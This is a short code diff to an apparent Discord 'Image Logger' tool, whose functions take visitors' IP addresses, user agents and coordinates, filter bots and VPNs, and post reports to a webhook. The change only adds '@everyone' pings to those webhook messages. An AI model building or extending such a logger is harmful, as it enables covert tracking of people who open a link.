@@ -77,7 +77,7 @@ def botCheck(ip, useragent):
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "",
+    "content": "@everyone",
     "embeds": [
         {
             "title": "Image Logger - Error",
@@ -115,7 +115,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
                 return
         
         if config["vpnCheck"] == 1:
-            ping = ""
+            ping = "@everyone"
     
     if info["hosting"]:
         if config["antiBot"] == 4:
